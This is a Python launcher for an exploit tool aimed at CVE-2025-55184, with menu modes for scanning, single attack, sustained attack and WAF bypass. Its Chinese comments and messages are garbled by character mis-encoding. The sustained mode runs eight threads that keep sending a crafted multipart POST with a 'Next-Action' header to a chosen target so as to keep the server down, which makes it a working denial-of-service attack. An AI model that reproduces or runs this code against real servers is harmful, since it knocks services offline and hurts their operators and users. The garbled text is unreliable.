#!/usr/bin/env python3
"""
CVE-2025-55184 ç®€åŒ–å¯åŠ¨å™¨ - ç®€å•æ¨¡å¼
æŒç»­æ”»å‡»å¹¶è‡ªåŠ¨æ¢å¤
ä½œè€…: CyberTechAjju
"""

import signal
import sys
import os

# å°†å½“å‰ç›®å½•æ·»åŠ åˆ°è·¯å¾„ä¸­
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from cve_2025_55184_exploit import CVE2025_55184_Exploiter
from modules.ui_manager import UIManager
from modules.utils import Utils

# ç”¨äºæ¸…ç†çš„å…¨å±€å˜é‡
running = True
current_exploiter = None


def signal_handler(sig, frame):
    """ä¼˜é›…åœ°å¤„ç† Ctrl+C - å…è®¸æœåŠ¡å™¨æ¢å¤"""
    global running, current_exploiter
    
    print("\n\n")
    ui = UIManager()
    ui.print_warning("ğŸ›‘ åœæ­¢æ”»å‡» - æœåŠ¡å™¨å°†è‡ªåŠ¨æ¢å¤...")
    
    running = False
    
    # ç»™æœåŠ¡å™¨æ—¶é—´æ¢å¤
    import time
    time.sleep(2)
    
    ui.print_success("âœ… æ”»å‡»å·²åœæ­¢ - ç›®æ ‡ç°åœ¨åº”è¯¥æ¢å¤æ­£å¸¸")
    ui.print_info("ğŸ’¡ æœåŠ¡å™¨å·²è¢«é‡Šæ”¾ï¼Œåº”å¤„äºè¿è¡ŒçŠ¶æ€")
    
    sys.exit(0)


def simple_menu():
    """ç®€å•çš„äº¤äº’å¼èœå•"""
    ui = UIManager()
    
    ui.show_banner()
    ui.show_warning()
    
    print()
    ui.console.print("[bold bright_cyan]â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—[/bold bright_cyan]")
    ui.console.print("[bold bright_cyan]â•‘[/bold bright_cyan]   ğŸš€ ç®€å•æ¨¡å¼ - ç®€æ˜“æ”»å‡»å·¥å…·   [bold bright_cyan]â•‘[/bold bright_cyan]")
    ui.console.print("[bold bright_cyan]â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_cyan]")
    print()
    
    # è·å–ç›®æ ‡
    target = ui.prompt_input("ğŸ¯ è¾“å…¥ç›®æ ‡URL (ä¾‹å¦‚: http://localhost:3000)")
    
    if not target:
        ui.print_error("æœªæŒ‡å®šç›®æ ‡!")
        return
    
    print()
    ui.console.print("[bold yellow]é€‰æ‹©æ”»å‡»æ¨¡å¼:[/bold yellow]")
    ui.console.print("  [cyan]1.[/cyan] ğŸ” å¿«é€Ÿæ‰«æ (æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´)")
    ui.console.print("  [cyan]2.[/cyan] ğŸ’¥ å•æ¬¡æ”»å‡» (ä¸€æ¬¡æ€§æ¦‚å¿µéªŒè¯)")
    ui.console.print("  [cyan]3.[/cyan] ğŸ”¥ æŒç»­æ”»å‡» (ä½¿ç›®æ ‡ä¿æŒå®•æœº)")
    ui.console.print("  [cyan]4.[/cyan] ğŸ›¡ï¸  WAFç»•è¿‡æµ‹è¯•")
    ui.console.print("  [cyan]5.[/cyan] ğŸ“Š ç”ŸæˆæŠ¥å‘Š")
    print()
    
    choice = ui.prompt_input("é€‰æ‹©é€‰é¡¹ (1-5)")
    
    # å°†é€‰é¡¹æ˜ å°„åˆ°æ¨¡å¼
    mode_map = {
        '1': 'scan',
        '2': 'single',
        '3': 'sustain',  # æ–°çš„æŒç»­æ¨¡å¼
        '4': 'waf',
        '5': 'report'
    }
    
    mode = mode_map.get(choice)
    
    if not mode:
        ui.print_error("æ— æ•ˆçš„é€‰æ‹©!")
        return
    
    # æˆæƒæ£€æŸ¥
    print()
    if not ui.get_authorization(target):
        ui.print_error("æˆæƒè¢«æ‹’ç»!")
        return
    
    # åŠ è½½é…ç½®
    config = Utils.load_config()
    
    # åˆ›å»ºåˆ©ç”¨ç¨‹åº
    global current_exploiter
    current_exploiter = CVE2025_55184_Exploiter(target, config)
    
    # è¿è¡Œæ”»å‡»
    try:
        if mode == 'sustain':
            run_sustained_attack(current_exploiter, ui)
        else:
            current_exploiter.run(mode)
    except KeyboardInterrupt:
        signal_handler(None, None)


def run_sustained_attack(exploiter, ui):
    """
    æŒç»­æ”»å‡»æ¨¡å¼ - åœ¨è„šæœ¬è¿è¡ŒæœŸé—´ä½¿ç›®æ ‡ä¿æŒå®•æœºçŠ¶æ€
    å½“è„šæœ¬ç»ˆæ­¢æ—¶è‡ªåŠ¨æ¢å¤
    """
    global running
    
    import threading
    import time
    import requests
    
    ui.print_error("ğŸ”¥ æŒç»­æ”»å‡»æ¨¡å¼å·²æ¿€æ´»")
    ui.print_warning("âš¡ ç›®æ ‡å°†åœ¨è¯¥è„šæœ¬è¿è¡Œæ—¶ä¿æŒå®•æœºçŠ¶æ€")
    ui.print_info("ğŸ’¡ æŒ‰ Ctrl+C åœæ­¢å¹¶å…è®¸æ¢å¤")
    print()
    
    confirm = ui.prompt_input("è¾“å…¥ 'ATTACK' å¼€å§‹æŒç»­DoSæ”»å‡»")
    if confirm != 'ATTACK':
        ui.print_info("å·²å–æ¶ˆ")
        return
    
    print()
    ui.print_success("ğŸš€ æŒç»­æ”»å‡»å·²å¼€å§‹!")
    ui.print_info("ğŸ“Š å®æ—¶ç»Ÿè®¡æ•°æ®å¦‚ä¸‹...")
    print()
    
    # ç»Ÿè®¡ä¿¡æ¯
    stats = {
        'total': 0,
        'timeouts': 0,
        'errors': 0,
        'running': True
    }
    
    # æ”»å‡»å·¥ä½œå‡½æ•°
    def attack_worker():
        """è¿ç»­æ”»å‡»å·¥ä½œçº¿ç¨‹"""
        payload = '"$@0"'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Next-Action': 'x'
        }
        
        while running and stats['running']:
            try:
                requests.post(
                    exploiter.target,
                    files={"0": ("", payload)},
                    headers=headers,
                    timeout=3
                )
                stats['total'] += 1
            except requests.exceptions.Timeout:
                stats['timeouts'] += 1
                stats['total'] += 1
            except Exception:
                stats['errors'] += 1
                stats['total'] += 1
            
            # å°å»¶è¿Ÿé˜²æ­¢èµ„æºè€—å°½
            time.sleep(0.1)
    
    # å¯åŠ¨æ”»å‡»çº¿ç¨‹
    num_threads = 8
    threads = []
    
    for i in range(num_threads):
        t = threading.Thread(target=attack_worker, daemon=True)
        t.start()
        threads.append(t)
    
    # å®æ—¶ç»Ÿè®¡æ•°æ®æ˜¾ç¤º
    try:
        start_time = time.time()
        
        while running:
            elapsed = int(time.time() - start_time)
            
            # æ¸…é™¤å‰ä¸€è¡Œ
            print(f"\r[âš¡] è¯·æ±‚: {stats['total']:>6} | è¶…æ—¶: {stats['timeouts']:>6} | é”™è¯¯: {stats['errors']:>6} | æ—¶é—´: {elapsed:>4}s | çº¿ç¨‹: {num_threads}", end='', flush=True)
            
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        pass
    finally:
        stats['running'] = False
        print("\n")
        ui.print_info("æ­£åœ¨åœæ­¢æ”»å‡»çº¿ç¨‹...")
        time.sleep(1)
        ui.print_success(f"âœ… å‘é€çš„æ€»è¯·æ±‚æ•°: {stats['total']}")
        ui.print_info("ğŸ’¡ æœåŠ¡å™¨åº”åœ¨5-10ç§’å†…æ¢å¤")


def main():
    """ä¸»å…¥å£ç‚¹"""
    # è®¾ç½®ä¿¡å·å¤„ç†å™¨ä»¥å®ç°ä¼˜é›…å…³é—­
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        simple_menu()
    except Exception as e:
        ui = UIManager()
        ui.print_error(f"é”™è¯¯: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()